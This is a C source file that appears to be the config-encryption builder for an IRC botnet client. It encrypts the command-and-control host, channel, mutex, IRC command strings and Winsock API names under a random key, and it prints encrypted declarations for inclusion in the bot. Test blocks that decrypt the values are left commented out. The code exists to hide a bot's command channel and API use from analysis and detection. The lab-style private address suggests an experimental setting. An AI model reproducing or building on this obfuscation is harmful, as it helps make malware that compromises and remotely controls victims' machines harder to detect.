#include "main.h"

char your_host[]	= "192.168.0.101";
char your_chan[]	= "#lab";
char your_mutex[]	= "coolstorybro";

char irc_join[]		= "JOIN";
char irc_nick[]		= "NICK";
char irc_ping[]		= "PING";
char irc_user[]		= "USER";
char irc_privmsg[]	= "PRIVMSG";
/*
char str_wsdll[]	= "ws2_32.dll";
char str_wsa[]		= "WSAStartup";
char str_sock[]		= "socket";
char str_ghbn[]		= "gethostbyname";
char str_conn[]		= "connect";
char str_send[]		= "send";
char str_recv[]		= "recv";
char str_htons[]	= "htons";
char str_closesock[]= "closesocket";
*/
#define enc( a, b ) crypt( (u_char *)a, strlen((char *)a), (u_char *)b, strlen((char *)b) );

int main( void )
{
	DeleteFile( "config.txt" ); // whatever dog

	// randomly generated key
	srand( GetTickCount() );
	u_char randkey[128] = {0};
	for ( int x = 0; x < 128U; x++ ) randkey[x] = rrand( 1, 99 );
	printcfg( "char crypt_key[] = \"%s\";\n", blah((char *)randkey));

	// config
	enc( your_host, randkey );
	printcfg( "char cfg_host[] = \"%s\";", blah(your_host) );

	enc( your_chan, randkey );
	printcfg( "char cfg_chan[] = \"%s\";", blah(your_chan) );

	enc( your_mutex, randkey );
	printcfg( "char cfg_mutex[] = \"%s\";", blah(your_mutex) );

	// strings
	enc( irc_join, randkey );
	printcfg( "char str_irc_join[] = \"%s\";", blah(irc_join) );

	enc( irc_nick, randkey );
	printcfg( "char str_irc_nick[] = \"%s\";", blah(irc_nick) );

	enc( irc_ping, randkey );
	printcfg( "char str_irc_ping[] = \"%s\";", blah(irc_ping) );

	enc( irc_user, randkey );
	printcfg( "char str_irc_user[] = \"%s\";", blah(irc_user) );

	enc( irc_privmsg, randkey );
	printcfg( "char str_irc_privmsg[] = \"%s\";", blah(irc_privmsg) );
/*
	enc( str_wsdll, randkey );
	printcfg( "char str_wsdll[] = \"%s\";", blah(str_wsdll) );

	enc( str_wsa, randkey );
	printcfg( "char str_wsa[] = \"%s\";", blah(str_wsa) );

	enc( str_sock, randkey );
	printcfg( "char str_sock[] = \"%s\";", blah(str_sock) );

	enc( str_ghbn, randkey );
	printcfg( "char str_ghbn[] = \"%s\";", blah(str_ghbn) );

	enc( str_conn, randkey );
	printcfg( "char str_conn[] = \"%s\";", blah(str_conn) );

	enc( str_send, randkey );
	printcfg( "char str_send[] = \"%s\";", blah(str_send) );

	enc( str_recv, randkey );
	printcfg( "char str_recv[] = \"%s\";", blah(str_recv) );

	enc( str_closesock, randkey );
	printcfg( "char str_closesock[] = \"%s\";", blah(str_closesock) );

	enc( str_htons, randkey );
	printcfg( "char str_htons[] = \"%s\";", blah(str_htons) );
*/
	return 0;
}
/*
	char crypt_key[] = 
		"\x04\x5D\x0E\x44\x37\x07\x3D\x57\x1D\x06\x3E\x2D\x30\x56\x38\x41\x1B\x60\x0D\x4B\x29\x4F\x11\x0B\x2E\x1D\x38\x41\x43\x07\x62\x11\x3D\x1F\x46\x06\x08\x60\x13\x0F\x12\x2F\x3E\x19\x03\x1E\x1B\x4E\x15\x52\x38\x2D\x0B\x48\x09\x10\x3B\x18\x0F\x0C\x01\x5A\x18\x2F\x4A\x38\x5F\x13\x54\x42\x53\x49\x2F\x3D\x32\x14\x53\x59\x43\x20\x2F\x09\x36\x1A\x25\x21\x4B\x24\x61\x1F\x54\x5A\x28\x24\x13\x03\x5F\x56\x19\x52\x21\x2F\x2C\x4A\x38\x0E\x0B\x2E\x0B\x50\x05\x12\x03\x3F\x12\x35\x54\x2B\x3B\x15\x58\x24\x4F\x1F\x4A\x39\x0E\x42\xCC\xCC\xCC\xCC\x79\xDA\x55\xF8\xB8\xFF\x12";
	char enc_host[] = "\x1B\x89\x60\xD9\x2B\xB0\xA6\x80\xCD\x9D\xC4\x24\x97";

	u_char *dec_host = (u_char *)malloc( 512 );
	memcpy( dec_host, enc_host, sizeof(enc_host) );
	enc( dec_host, crypt_key );
	printf( "dec_host == \"%s\";\n", dec_host );
	memset( dec_host, 0, sizeof(dec_host) );
	if ( !dec_host[0] ) printf( "ok!\n" );
*/
/*
	char crypt_key[] = 
		"\x04\x5D\x0E\x44\x37\x07\x3D\x57\x1D\x06\x3E\x2D\x30\x56\x38\x41\x1B\x60\x0D\x4B\x29\x4F\x11\x0B\x2E\x1D\x38\x41\x43\x07\x62\x11\x3D\x1F\x46\x06\x08\x60\x13\x0F\x12\x2F\x3E\x19\x03\x1E\x1B\x4E\x15\x52\x38\x2D\x0B\x48\x09\x10\x3B\x18\x0F\x0C\x01\x5A\x18\x2F\x4A\x38\x5F\x13\x54\x42\x53\x49\x2F\x3D\x32\x14\x53\x59\x43\x20\x2F\x09\x36\x1A\x25\x21\x4B\x24\x61\x1F\x54\x5A\x28\x24\x13\x03\x5F\x56\x19\x52\x21\x2F\x2C\x4A\x38\x0E\x0B\x2E\x0B\x50\x05\x12\x03\x3F\x12\x35\x54\x2B\x3B\x15\x58\x24\x4F\x1F\x4A\x39\x0E\x42\xCC\xCC\xCC\xCC\x79\xDA\x55\xF8\xB8\xFF\x12";
	char enc_host[] = "\x1B\x89\x60\xD9\x2B\xB0\xA6\x80\xCD\x9D\xC4\x24\x97";

	u_char *dec_host = decrypt( enc_host, sizeof(enc_host), crypt_key );
	printf( "dec_host == \"%s\";\n", dec_host );
	memset( dec_host, 0, sizeof(dec_host) );
	if ( !dec_host[0] ) printf( "ok!\n" );
*/